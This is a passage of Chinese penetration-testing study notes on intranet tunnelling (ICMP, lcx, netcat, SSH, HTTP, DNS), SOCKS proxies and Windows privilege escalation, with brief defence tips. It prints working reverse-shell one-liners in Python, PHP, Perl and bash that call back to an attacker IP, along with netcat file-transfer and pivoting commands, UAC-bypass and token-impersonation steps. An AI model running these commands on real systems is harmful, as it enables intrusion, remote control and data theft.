net.ipv4.icmp_echo_ignore_all=1</code>（开启设置为0）</li></ul></li><li><p><code>PingTunnel</code>：配置起来比较麻烦，需要安装很多环境</p></li><li><p><code>icmptunnel</code></p></li><li><p><code>powershell icmp</code></p></li></ol><p><strong>防御方法</strong></p><ul><li>检测同一来源的数据包的数量</li><li>注意Payload大于64bit的ICMP数据包</li><li>寻找响应数据包中的payload与请求数据包中的payload不一致的ICMP数据包</li><li>检查ICMP数据包的协议标签，例如<code>icmptunnel</code>会在所有的ICMP payload前面添加一个TUNL标记来标识隧道</li></ul><h5 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h5><p>传输层技术包括TCP隧道，UDP隧道和常规的端口转发。</p><h6 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a><strong>lcx端口转发</strong></h6><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows（lcx.exe）和Linux（portmap）两个版本，一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端，通过传入服务端的IP和端口才能主动与服务器连接</p><p>下载：<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><p><strong>内网端口转发</strong></p><p>在目标主机上执行命令，将目标机器的3389端口的所有数据转发到公网VPS的4444端口上<code>lcx.exe -slave &lt;公网IP&gt; 4444 127.0.0.1 3389</code></p><p>在VPS上执行命令，将本地4444端口上监听的所有数据转发到本机的5555端口上<code>lcx.exe -listen 4444 5555</code></p><p>利用mstsc登录远程桌面&lt;公网IP&gt;:5555 或者在VPS上直接连接远程桌面127.0.0.1:5555</p><p><strong>本地端口映射</strong></p><p>如果目标服务器由于防火墙的限制，部分端口无法通过防火墙，可以将目标服务器的相应端口的数据传到防火墙允许的其他端口（例如53）<code>lcx -tran 53 &lt;目标主机IP地址&gt; 3389</code></p><h6 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a><strong>netcat</strong></h6><p><strong>简单使用</strong></p><ul><li><p>抓取Banner信息<code>nc -nv 192.168.123.123 21</code> 抓取目标主机21端口的Banner信息</p></li><li><p>远程连接主机<code>nc -nvv 192.168.123.123 80</code></p></li><li><p>端口扫描<code>nc -v 192.168.123.123 80</code>  <code>nc -v -z 192.168.123.123 20-1024</code>（扫描端口段速度较慢）</p></li><li><p>端口监听<code>nc -l -p 9999</code> 监听本地端口，访问该端口时会输出该信息到命令行</p></li><li><p>文件传输vps输入<code>nc -lp 333 &gt; 1.txt</code> 目标主机输入<code>nc -vn 192.168.1.4 333 &lt; test.txt -q 1</code>一旦连接建立，数据便会流入</p></li><li><p>获取shell</p><ul><li><p>客户端连接服务器，客户端获取服务器shell这种称为正向shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113202468.png" alt="image-20210730113202468"></p></li><li><p>客户端连接服务器，服务器获取客户端shell这种称为反向shell，反向shell通常用在开启防火措施的目标主机上</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730113725281.png" alt="image-20210730113725281"></p></li><li><p>目标主机没有nc时获取反向shell</p><ul><li><p>python反向shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import socket,subprocess,os; \</span><br><span class="hljs-string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">s.connect((&quot;192.168.1.4&quot;,2222));</span><br><span class="hljs-string">os.dup2(s.fileno(),0);</span><br><span class="hljs-string">os.dup2(s.fileno(),1);</span><br><span class="hljs-string">os.dup2(s.fileno(),2);</span><br><span class="hljs-string">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>PHP反向shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;192.168.1.4&quot;,2222);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>Perl反向shell</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;$i=<span class="hljs-string">&quot;192.168.1.4&quot;</span>;$p=<span class="hljs-number">4444</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>)),<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure></li><li><p>bash反向shell <code>bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1</code></p></li></ul></li></ul></li><li><p>内网代理</p><p>假设限制获取到了Web服务器的权限，通过Kali不能访问到数据库服务器，web服务器可以访问数据库服务器。使用netcat通过web服务器代理使kali获取到数据库服务器的shell</p><p>kali：<code>nc -lvp 9999</code></p><p>数据库服务器：<code>nc -lvp 9999 -e /bin/sh</code></p><p>web服务器：<code>nc -v kali-ip 9999 -c &quot;nc -v 数据库-ip 9999&quot;</code></p></li></ul><h6 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a><strong>PowerCat</strong></h6><p>PowerCat可以说是nc的powershel版，它可以通过执行命令回到本地运行，也可以使用远程权限运行，具体使用方法打到靶场再来总结</p><h5 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a><strong>应用层隧道技术</strong></h5><h6 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a><strong>SSH协议</strong></h6><p>内网中Linux/UNIX服务器和网络设备都支持SSH协议，一般情况下SSH协议是被允许通过防火墙和边界设备的。SSH协议的传输过程</p><p> <img src="https://gitee.com/lcdm123/image/raw/master/image-20210730125530065.png" alt="image-20210730125530065"></p><p><strong>本地转发</strong></p><p>web服务器可以访问数据库服务器，vps可以访问web服务器，vps不能访问数据库  ，以web服务器为跳板机将数据库服务器的端口映射到vps的端口上</p><p><code>ssh -CfNg -L vps-port:数据库服务器-ip:数据库服务器port root@192.168.1.103</code></p><p>SSH进程的本地端口映射可以将本地的某个端口转发到远程指定的机器的指定端口；本地端口转发则是在本地监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口</p><p><strong>远程转发</strong></p><p><code>ssh -CfNg -R vps-port:数据库服务器-ip:数据库服务器port root@192.168.1.103</code></p><p><strong>本地转发</strong>是将<strong>远程主机</strong>（服务器）某个端口的<strong>数据转发</strong>到<strong>本地机器的指定端口</strong>。<strong>远程端口转发</strong>则是在<strong>远程主机上监听一个端口</strong>，所有<strong>访问远程服务器指定端口的数据</strong>都会通过<strong>SSH隧道传输到本地对应端口</strong>。</p><p><strong>动态转发</strong></p><p>首先在vps上执行如下命令建立一个动态的SOCKS 4/5代理通道<code>ssh -CfNg -D 7000 root@192.168.1.103</code>，在本地浏览器设置网络代理，通过浏览器访问内网</p><p><strong>防御措施</strong></p><p>SSH隧道被攻击主要是因为系统访问控制措施不够，在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法来避免这一问题。在内网中至少要限制ssh远程登录的地址和双向访问控制策略</p><h6 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a><strong>HTTP/HTTPS协议</strong></h6><p>HTTP Service代理用于将所有的流量转发到内网，常见的代理工具有reGeorg，meterpreter，tunna等</p><p>reGeorg是reDuh的升级版，主要功能就是把内网服务器端口的数据通过HTTP、HTTPS隧道转发到本机，实现基于HTTP协议的通信。其脚本特征明显，很多杀软都会对其进行查杀。</p><p>下载：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><p>使用:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">python reGeorgSocksProxy.py -u http:<span class="hljs-regexp">//i</span>p:port/tunnel.jsp -p <span class="hljs-number">9999</span> 开启隧道端口<br>隧道正常工作后在kali上使用 ProxyChains之类的工具，访问目标内网<br></code></pre></td></tr></table></figure><h6 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a><strong>DNS协议</strong></h6><p>用于管理僵尸网络和进行APT攻击的服务器叫做C&amp;C服务器，C&amp;C节点分为两种，分别是服务端（攻击者）和客户端（被控制的计算机）。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p><p>DNS隧道的工作原理：在进行DNS查询的时候，如果查询的域名不在DNS服务器本机上的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议角度看 ，这样的操作只是一次次地查询某个特定的域名并且得到解析结果，但其本质问题是，<strong>预期的返回结果应该是一个IP，而事实上返回的结果可以是任意字符串</strong>（例如加密的C&amp;C指令）</p><p>DNS隧道与外部通信时，表面上没有连接外网（内网网关没有转发IP数据包），但实际上内网的DNS服务器进行了中转操作。将其他协议封装在DNS协议中进行传输。</p><p><strong>查看DNS连通性</strong></p><p>首先我们需要找到当前服务器是否允许通过内部DNS解析外部域名</p><p>查看当前内部域名以及IP：<code>cat /etc/resolv.conf | grep -v &#39;#&#39;</code></p><p>查看是否与内部DNS通信：<code>nslookup lcdm123.com</code></p><p>查询是否可以通过内部DNS服务器解析外部域名：<code>nslookup baidu.com</code></p><p><strong>dnscat2</strong></p><p>dnscat2时一款开源软件，它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证。它的客户端是用C语言编写，服务端是用Ruby语言编写。</p><p>dnscat2隧道模式有两种：</p><ul><li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，这种比较慢</li></ul><p>DNS隧道应用场景：在安全策略严格的内网环境中，常见的C&amp;C通信端口会被众多安全设备监控，该网段只允许白名单流量出站，同时其他端口都被屏蔽了，传统的C&amp;C通信无法建立。</p><p>工具：</p><ul><li><p>dnscat2</p><p>下载：<a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a>   </p><p>​            <a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a>   </p><p>​            <a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p></li><li><p>iodine</p></li></ul><p><strong>防御DNS隧道攻击</strong></p><ol><li>禁止任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信</li><li>追踪用户的DNS查询次数，设置阈值</li><li>阻止ICMP</li><li>将邮件服务器、网关列入白名单并阻止传入和传出流量中的TXT请求</li></ol><h5 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h5><p>常见的网络环境</p><ul><li>服务器在内网中，可以任意访问外部网络</li><li>服务器在内网中，可以访问外部网络但是服务器安装了防火墙来拒绝敏感端口的连接</li><li>服务器在内网中，对外只开放了部分端口，并且服务器不能访问外部网络</li></ul><p>常用的Socks代理工具</p><ul><li><p><code>EarthWorm</code></p><p>体积小，使用时不需要进行其他设置</p><p>下载：<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a></p></li><li><p><code>reGeorg</code></p><p>上面HTTP隧道时介绍过，它利用webshell建立Socks代理进行内网穿透，服务器必须支持ASPX，PHP，JSP中的一种</p></li><li><p><code>sSocks</code></p></li><li><p><code>SocksCap64</code></p><p>Windows中很好用的一款全局代理软件，操作方便</p><p>下载：<a href="https://www.sockscap64.com/sockscap-64-free-download-zh-hans/">https://www.sockscap64.com/sockscap-64-free-download-zh-hans/</a></p></li><li><p><code>Proxifier</code></p><p>提供了跨平台的端口转发和代理功能，适用于Windows，Linux，MacOS</p><p>下载：<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p></li><li><p><code>ProxyChains</code></p><p>在Linux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP，SOCKS 4 ，SOCKS 5类型的代理服务器</p></li></ul><h5 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a><strong>上传和下载</strong></h5><ul><li><p>利用FTP协议上传</p></li><li><p>利用VBS上传</p></li><li><p>利用Debug上传</p><p>将.exe文件转换为HEX的形式，然后通过echo命令将HEX代码写入文件，最后利用Debug功能将HEX代码编译并还原为.exe文件</p></li><li><p>使用<code>Nishang</code>上传</p></li><li><p>利用<code>bitsadmin</code>下载（推荐在windows7 和 8 上使用）</p></li><li><p>利用<code>powershell</code>下载</p></li></ul><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>Windows的四种权限</p><ol><li><code>User</code>：普通用户权限</li><li><code>Administrator</code>：管理员权限，可以利用windows的机制将自己提升为System权限，以便操作SAM文件等</li><li><code>System</code>：系统权限，可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作</li><li><code>TrustedInstaller</code>：Windows中的最高权限，能够修改系统文件</li></ol><p><strong>纵向提权</strong>：低权限角色获得高权限角色的权限。</p><p><strong>横向提权</strong>：获得同级别角色的权限。例如：在系统A中获取了系统B的权限</p><p><strong>常用的提权方法</strong>：系统内核溢出漏洞提权，数据库提权，错误的系统配置提权，组策略首选项提权，Web中间件漏洞提权，DLL劫持提权，滥用最高权限令牌提权，第三方软件/服务提权等。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806163424137.png" alt="image-20210806163424137"></p><h5 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h5><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><p><a href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></p><p>内核溢出漏洞提权是一种通用的提权方法，通常利用这个方法绕过系统的所有安全限制。如果目标主机没有及时安装补丁，就可以找到相应的EXP提权。</p><p>查看补丁列表：<code>systeminfo</code>  <code>wmic qfe get Caption,Description,HotFixID,Installedon0</code></p><p>查询到补丁安装情况后可以去看哪些补丁漏装了，然后提权。</p><p><code>Windows Exploit Suggester</code>：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a> 这个工具将系统以及安装的补丁和微软的漏洞数据库进行比较识别出可能导致权限提升的漏洞，而其只需要目标系统的信息。</p><p>这个是<a href="https://github.com/bitsadmin/wesng%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%8D%87%E7%BA%A7%E7%89%88">https://github.com/bitsadmin/wesng上面的升级版</a></p><p>Metasploit内置了<code>local_exploit_suggester</code>模块，用于快速识别系统中可以被利用的漏洞；Powershell的Sherlock脚本可以快速查找可能用于本地权限提升的漏洞<a href="https://github.com/rasta-mouse/Sherlock%EF%BC%8C%E8%B0%83%E7%94%A8%E8%84%9A%E6%9C%AC%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E5%8D%95%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%E6%89%80%E6%9C%89%E6%9C%AA%E5%AE%89%E8%A3%85%E7%9A%84%E8%A1%A5%E4%B8%81%E3%80%82">https://github.com/rasta-mouse/Sherlock，调用脚本后可以搜索单个漏洞也可以搜索所有未安装的补丁。</a></p><h5 id="操作系统配置错误"><a href="#操作系统配置错误" class="headerlink" title="操作系统配置错误"></a>操作系统配置错误</h5><ol><li><p><strong>系统服务权限配置错误</strong></p><ul><li>服务未运行：攻击者会使用任意服务来替换原来的服务，然后重启服务</li><li>服务正在运行并且无法被终止：这个是大多数漏洞利用场景。攻击者通常会利用DLL劫持技术尝试重启服务来提权</li></ul><p>PowerUP：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%AF%BB%E6%89%BE%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E7%9A%84windows%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%EF%BC%9B">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1，用来寻找目标机器的windows服务漏洞；</a></p><p>Metasploit中的模块是service_permissions，选择”AGGRESSIVE”选项可以利用目标机器上每一个有缺陷的服务，该选项被禁用时，模块在第一次提权成功后就会停止工作</p></li><li><p><strong>注册表键</strong> <code>AlwaysInstallElevated</code></p><p>注册表键<code>AlwaysInstallElevated</code>是一个策略设置向，Windows允许低权限用户以System权限运行安装文件，如果启用此策略设置项，那么任何低权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件</p><p><code>PathAlwaysInstallElevated</code>漏洞产生的原因是用户开启了Windows Installer特权安装功能。Windows Installer是windows的组件之一，专门用来管理和配置软件服务。它除了是一个安装程序，还用于管理软件的安装，管理软件组件的添加和删除，监视文件的还原，通过回滚进行灾难恢复等。Windows Installer分为客户端安装服务（Msiexec.exe）和MSI文件两部分，他们是一起工作的，Windows Installer通过Msiexec.exe安装MSI文件包含程序，MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件是需要使用的大量指令和数据。简单来说，双击MSI文件就可以运行Msiexec.exe</p><p>PowerUp的<code>Get-RegistryAlwaysInstallerElevated</code>模块用来检测注册表键是否被设置，如果<code>AlwaysInstallElevated</code>已经被设置就表明了MSI文件是以System权限运行的（True表示已经被设置）</p><p>个人理解：这个漏洞就是利用MSI运行时权限问题来造成提权</p></li><li><p><strong>可信任服务路径漏洞</strong></p><p>利用了windows文件路径解析的特性，如果一个服务的<strong>可执行文件的路径没有被双引号引起来且包含空格</strong>，那么这个服务就是有漏洞的</p><ul><li>如果路径和服务有关，就可以任意创建一个服务或者编译Service模板</li><li>如果路径和可执行文件有关，就可以任意创建一个可执行文件</li></ul><p>寻找漏洞：<code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot; </code></p><p>需要进一步检测目标文件夹的写权限，使用windows内置的工具<code>icacls</code>：<code>icacls &quot;path&quot;</code></p><p>然后把上传的程序重命名放置在此漏洞且可写的目录下，重启服务<code>sc stop service_name</code> <code>sc start service _name</code></p><p>MSF攻击模块 <code>exploit/windows/local/trusted_service_path</code>，它会自动反弹一个新的metertreter，查询显示提权成功，但是这个链接很快就会断开，需要在断开前迁移进程<code>set AutoRunScript migrate -f</code></p></li><li><p><strong>自动安装配置文件</strong></p><p>网络管理员在内网给多台机器配置同一环境时，通常会使用脚本化批量部署，过程中会使用安装配置文件，这些文件会包含一些敏感信息</p><p>文件检查：<code>dir /b /s c:\Unattend.xml</code></p><p>MSF攻击模块：<code>post/windows/gather/enum_unattend</code></p></li><li><p><strong>计划任务</strong></p><p>查看计划任务：<code>schtasks /query /fo LIST /v</code></p><p>AccessChk是SysInterals套件中的一个工具，用于在windows中进行一些系统或程序的高级查询，管理，故障排除工作。它是微软官方提供的工具，一般不会被杀毒软件发现，下载：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%94%BB%E5%87%BB%E8%80%85%E5%AF%B9%E4%BB%A5%E9%AB%98%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E4%BB%BB%E5%8A%A1%E7%9B%AE%E5%BD%95%E6%9C%89%E5%8F%AF%E5%86%99%E6%9D%83%E9%99%90%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A6%86%E7%9B%96%E5%8E%9F%E7%A8%8B%E5%BA%8F%E3%80%82">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk，如果攻击者对以高权限运行的任务目录有可写权限就可以利用恶意程序覆盖原程序。</a></p><p>查看目录权限配置情况：<code>accesschk.exe -dqv &quot;c:\Microsoft&quot; -accepteula</code></p><p>其他常用命令</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">accesschk.exe /accepteula  <span class="hljs-comment"># 自动接受许可协议，避免弹出对话框</span><br><br><span class="hljs-comment"># 列出某个驱动下所有权限配置有缺陷的文件夹</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\</span><br><span class="hljs-comment"># 列出某个驱动下所有权限配置有缺陷的文件</span><br>accesschk.exe -uwdqsUsersc:<span class="hljs-string">\*.*</span><br>accesschk.exe -uwqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\*.*</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="组策略首选项提"><a href="#组策略首选项提" class="headerlink" title="组策略首选项提"></a>组策略首选项提</h5><p><strong>简介</strong></p><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有于控制器之间进行复制。SYSVOL文件夹是安装活动目录时自动创建的，用来存放登录脚本，组策略数据以及其它域控制器需要的域信息。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。SYSVOL目录中所有的域控制器中是自动同步的，所有域策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies\</code>中</p><p>常见的组策略首选项（Group Policy Preferences，GPP)：</p><ul><li>映射驱动器（Drives.xml )</li><li>创建本地用户</li><li>数据源（DataSources.xml )</li><li>打印机配置(Printers.xml )</li><li>创建/更新服务(（Services.xml )</li><li>计划任务（ScheduledTasks.xml )</li></ul><p><strong>获取组策略的凭据</strong></p><p>管理员在域中新建一个组策略后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件保存了该组策略更新后的密码。该密码是使用AES-256加密算法，任何用户都可以访问保存在XML文件中的密码并解密，从而控制域中所有使用该账户/密码的本地管理员计算机。在SYSVOL中搜索，可以找到包含<code>cpassword</code>的XML文件</p><ul><li><p>手动查找<code>cpassword</code></p></li><li><p>使用<code>Powershell</code>获取<code>cpassword</code></p><p>目标系统导入Get-GPPPassword.ps1脚本获取</p></li><li><p>使用MSF查找<code>cpassword</code></p><p>选择相应的模块即可</p></li><li><p>使用Empire查找<code>cpassword</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">usemodule</span> privesc/gpp<br><span class="hljs-literal">info</span><br>execute<br></code></pre></td></tr></table></figure></li></ul><p>除了Groups.xml还有几个组策略首选项文件中有可选的cpassword 属性</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Services\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Scrvices</span>.</span></span>xml<br>scheduledTasks\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScheduledTasks</span>.</span></span>xml.<br>Printers\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Printers</span>.</span></span>xml<br>Drives\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Drives</span>.</span></span>xml<br>DataSources\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataSources</span>.</span></span>xml<br></code></pre></td></tr></table></figure><h5 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h5><blockquote><p>UAC(User Account Control) 在操作启动前对用户的身份进行验证，避免恶意软件在计算机上执行安装操作或更改计算机设置；微软设置了安全控制策略，分为高，中，低三个等级，高等级具有管理员权限，中等级有普通用户权限，低等级的权限是有限的</p><p>UAC有四种设置要求：<br>1、始终通知<br>2、仅在程序试图更改我的计算机时通知我（默认设置）<br>3、仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）<br>4、从不提示</p></blockquote><ul><li><p><strong>bypassuac</strong> 模块</p><p>使用MSF的<code>bypassuac</code>模块的时候，当前用户必须在管理员组中，且UAC为默认设置（即：仅在程序试图更改我的计算机时通知我），bypassuac模块运行时，会在目标机器上创建多个文件，这些文件会被杀软识别，但是<code>bypassuac_injection</code>模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，被检测出来的概率小。</p></li><li><p><strong>RunAs</strong> 模块</p><p>使用<code>exploit/windows/local/ask</code>模块，创建一个可执行文件，目标机器会运行一个发起提升权限的请求程序提示用户是否要继续运行，如果用户选择继续运行，就会返回一个高权限shell。</p><p>想要执行RunAs模块进行提权，当前用户必须在管理员组或者知道管理员的密码，对UAC的设置没有要求，使用RunAs模块时需要使用<code>EXE::Custom</code>选项创建一个可执行文件（需要免杀处理）</p></li><li><p>Nishang中的Invoke-PaUACme模块</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Invoke-PsUACme -Verbose # 使用Sysprep方法并执行默认的payload<br>Invoke-PsUACme -<span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> # 使用<span class="hljs-title">oobe</span>方法并执行默认的<span class="hljs-title">payload</span></span><br><span class="hljs-function"><span class="hljs-title">Invoke</span>-<span class="hljs-title">PsUACme</span> -<span class="hljs-title">method</span> <span class="hljs-title">oobe</span> -<span class="hljs-title">Verbose</span> -<span class="hljs-title">Payload</span> &quot;<span class="hljs-title">powershell</span> -<span class="hljs-title">windowstyle</span> <span class="hljs-title">hidden</span> -<span class="hljs-title">e</span> <span class="hljs-title">YourPayload</span>&quot;  # 自己指定<span class="hljs-title">payload</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">-<span class="hljs-title">PayloadPath</span> 指定<span class="hljs-title">payload</span>的路径</span><br><span class="hljs-function">-<span class="hljs-title">CustomDll64</span> 或 -<span class="hljs-title">CustomDll32</span> 可以自定义<span class="hljs-title">DLL</span>文件</span><br></code></pre></td></tr></table></figure></li><li><p>Empire中的bypassuac模块</p><ul><li><p>bypassuac模块</p><p>在Empire中输入<code>usemodule privesc/bypassuac</code> 设置监听参数，执行 <code>execute</code>就可以获得新的shell，使用list查看，带星号（*）就表示提权成功</p></li><li><p>bypassuac_wscript模块</p><p>模块大致原理就是使用<code>C:\Windows\wscript.exe</code>执行<code>Payload</code>绕过UAC，适用于Win7，查看带星号（*）就表示提权成功</p></li></ul></li></ul><h5 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h5><blockquote><p>令牌是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求的是哪个账户，令牌将持续存在于系统中（除非系统重启）</p></blockquote><p>伪造令牌攻击的核心是<code>Kerberos</code>协议</p><p>MSF获取令牌</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> incognito <br>list_tokens -u <span class="hljs-comment"># 列出可用的token 令牌的数量取决于MSFshell的级别</span><br>impersonate_token 令牌 <span class="hljs-comment"># 假冒令牌</span><br></code></pre></td></tr></table></figure><p>如果系统存在有效的令牌，我们也可以尝试通过Rotten Potato程序来模拟用户令牌实现权限的提升</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><p>使用MSF查询可用令牌</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">use</span> <span class="hljs-string">incognito</span><br><span class="hljs-attr">list_tokens</span> <span class="hljs-string">-u</span><br></code></pre></td></tr></table></figure><p>将<code>rottenpotato.exe</code>上传到目标机器中</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">upload rottenpotato.exe <span class="hljs-comment"># MSF上传</span><br>execute -HC -f rottenpotato.exe<br>impersonate_token 令牌 <span class="hljs-comment"># 